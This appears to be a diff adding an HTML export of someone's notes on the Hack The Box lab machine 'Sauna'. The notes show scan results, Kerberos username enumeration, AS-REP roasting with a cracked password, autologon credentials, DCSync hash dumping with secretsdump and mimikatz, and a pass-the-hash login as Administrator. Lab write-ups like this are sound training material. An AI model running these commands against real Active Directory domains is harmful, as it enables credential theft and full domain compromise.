@@ -1,0 +1,137 @@
+<html>
+  
+  <head>
+    <meta charset="utf-8">
+  </head>
+  
+  <body>
+    <p>NMAP</p>
+    <p><code>PORT&nbsp; &nbsp; &nbsp; STATE SERVICE&nbsp; &nbsp; &nbsp; VERSION</code>
+    </p>
+    <p><code>53/tcp&nbsp; &nbsp; open&nbsp; domain&nbsp; &nbsp; &nbsp; &nbsp; Simple DNS Plus</code>
+    </p>
+    <p><code>80/tcp&nbsp; &nbsp; open&nbsp; http&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Microsoft IIS httpd 10.0</code>
+    </p>
+    <p><code>| http-methods:</code>
+    </p>
+    <p><code>|&nbsp; Supported Methods: OPTIONS TRACE GET HEAD POST</code>
+    </p>
+    <p><code>|_&nbsp; Potentially risky methods: TRACE</code>
+    </p>
+    <p><code>|_http-server-header: Microsoft-IIS/10.0</code>
+    </p>
+    <p><code>|_http-title: Egotistical Bank :: Home</code>
+    </p>
+    <p><code>88/tcp&nbsp; &nbsp; open&nbsp; kerberos-sec&nbsp; Microsoft Windows Kerberos (server time: 2023-10-05 08:47:02Z)</code>
+    </p>
+    <p><code>135/tcp&nbsp; open&nbsp; msrpc&nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</code>
+    </p>
+    <p><code>139/tcp&nbsp; open&nbsp; netbios-ssn&nbsp; Microsoft Windows netbios-ssn</code>
+    </p>
+    <p><code>389/tcp&nbsp; open&nbsp; ldap&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</code>
+    </p>
+    <p><code>445/tcp&nbsp; open&nbsp; microsoft-ds?</code>
+    </p>
+    <p><code>464/tcp&nbsp; open&nbsp; tcpwrapped</code>
+    </p>
+    <p><code>593/tcp&nbsp; open&nbsp; ncacn_http&nbsp; &nbsp; Microsoft Windows RPC over HTTP 1.0</code>
+    </p>
+    <p><code>636/tcp&nbsp; open&nbsp; tcpwrapped</code>
+    </p>
+    <p><code>3268/tcp&nbsp; open&nbsp; ldap&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows Active Directory LDAP (Domain: EGOTISTICAL-BANK.LOCAL0., Site: Default-First-Site-Name)</code>
+    </p>
+    <p><code>3269/tcp&nbsp; open&nbsp; tcpwrapped</code>
+    </p>
+    <p><code>5985/tcp&nbsp; open&nbsp; http&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)</code>
+    </p>
+    <p><code>|_http-title: Not Found</code>
+    </p>
+    <p><code>|_http-server-header: Microsoft-HTTPAPI/2.0</code>
+    </p>
+    <p><code>9389/tcp&nbsp; open&nbsp; mc-nmf&nbsp; &nbsp; &nbsp; &nbsp; .NET Message Framing</code>
+    </p>
+    <p><code>49668/tcp open&nbsp; msrpc&nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</code>
+    </p>
+    <p><code>49673/tcp open&nbsp; ncacn_http&nbsp; &nbsp; Microsoft Windows RPC over HTTP 1.0</code>
+    </p>
+    <p><code>49674/tcp open&nbsp; msrpc&nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</code>
+    </p>
+    <p><code>49677/tcp open&nbsp; msrpc&nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</code>
+    </p>
+    <p><code>49690/tcp open&nbsp; msrpc&nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</code>
+    </p>
+    <p><code>49697/tcp open&nbsp; msrpc&nbsp; &nbsp; &nbsp; &nbsp; Microsoft Windows RPC</code>
+    </p>
+    <p>Service Info: Host: SAUNA; OS: Windows; CPE: cpe:/o:microsoft:windows</p>
+    <p>/images&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 301)
+      [Size: 150] [--&gt; http://10.10.10.175/images/]</p>
+    <p>/index.html&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 32797]</p>
+    <p>/css&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status:
+      301) [Size: 147] [--&gt; http://10.10.10.175/css/]</p>
+    <p>/contact.html&nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 15634]</p>
+    <p>/blog.html&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size:
+      24695]</p>
+    <p>/about.html&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 30954]</p>
+    <p>/.&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      (Status: 200) [Size: 32797]</p>
+    <p>/fonts&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status:
+      301) [Size: 149] [--&gt; http://10.10.10.175/fonts/]</p>
+    <p>/single.html&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; (Status: 200) [Size: 38059]</p>
+    <p>Names on domain</p>
+    <p>Fergus Smith</p>
+    <p>Shaun Coins</p>
+    <p>Bowie Taylor</p>
+    <p>Hugo Bear</p>
+    <p>Sophie Driver</p>
+    <p>Steven Kerb</p>
+    <p>We can use a script to make all possible username combos from this list.
+      Then use GetNPUsers to see who we can kerberos</p>
+    <p>create a user list and name it user.txt</p>
+    <p>python3 userlistcreator.py</p>
+    <p>./kerbrute_linux_amd64 userenum user.txt -d EGOTISTICAL-BANK.LOCAL --dc
+      <a
+      href="http://10.10.10.175">10.10.10.175</a>
+        <br>&nbsp;</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/29fe59d8-7d01-32e4-24ad-21ba447448be/image.png"
+      alt="">
+    </p>
+    <p>fsmith is a valid login</p>
+    <p>&nbsp;</p>
+    <p>Kerberoasting attack</p>
+    <p>python3 GetNPUsers.py 'EGOTISTICAL-BANK.LOCAL/' -dc-ip 10.10.10.175 -outputfile
+      hashes.txt -no-pass -format hashcat -usersfile fsmith.txt</p>
+    <p>hash</p>
+    <p>$krb5asrep$23$fsmith@EGOTISTICAL-BANK.LOCAL:6808caa9cbe41ae51ff8f8f7abbbbab7$ecf562617c21761ad3c9f05cf6ba05661b80ac3639d7ed328c2dd12c8c2f6cd7a827a11bcdc89cc68d8835eb31e5b0398be5f3cb49fcfae114695b5b6d33db8166fe8aaaceec84da27557a12cc31e21a648171ff7024549affca3e73f4108b9df1f0b0c1c00b0e5d7a0d2f1961195e77e27d5401f8298e7e1b86170ec59b59388ef87b2ff1725fb9beff55c539bbe3cf60b850fad7793fc8d25199812f25a0faab8c43350f2c9ddbb3b7f229b166f0a159ca50cdddf1f23564cd3126629dbf77334eb9f40b48c1bd48cac8da6617ab9149605cb02848b7cb7c49c6ae16f5889505fffbdbef8680cc193db314cf7cd9d4fdbe0ec42507175051a0b7bc62d8f023</p>
+    <p>hash cracks to Thestrokes23</p>
+    <p>fsmith:Thestrokes23</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/3a261dc5-e490-9993-0feb-7da206c3658f/image.png"
+      alt="">
+    </p>
+    <p>Found creds for svc_loanmanager</p>
+    <p>DefaultUserName&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;&nbsp;
+      :&nbsp; EGOTISTICALBANK\svc_loanmgr</p>
+    <p>&nbsp; &nbsp; DefaultPassword&nbsp; &nbsp; &nbsp; &nbsp; &nbsp; &nbsp;
+      &nbsp;&nbsp; :&nbsp; Moneymakestheworldgoround!</p>
+    <p>I had to cheat for this part as bloodhound would not work for me. But
+      we have GetChanges and GetChangesAll and bloodhound shows us how to exploit
+      this.</p>
+    <p>we can dump hashes of the admin with these commands</p>
+    <p>secretsdump.py 'svc_loanmgr:Moneymakestheworldgoround!@10.10.10.175'</p>
+    <p>hash with secretsdump</p>
+    <p>aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e</p>
+    <p>.\mimikatz 'lsadump::dcsync /domain:EGOTISTICAL-BANK.LOCAL /user:administrator'
+      exit</p>
+    <p>hash with mimikatz</p>
+    <p>d9485863c1e9e05851aa40cbb4ab9dff</p>
+    <p>Pass the hash attack</p>
+    <p>impacket-psexec egotistical-bank.local/Administrator@10.10.10.175 -hashes
+      "aad3b435b51404eeaad3b435b51404ee:823452073d75b9d1cf70ebdf86c7f98e"</p>
+    <p>
+      <img src="https://www.evernote.com/shard/s560/res/bcf760f8-7e5c-6246-edd5-659fcc335dad/image.png"
+      alt="">
+    </p>
+  </body>
+
+</html>
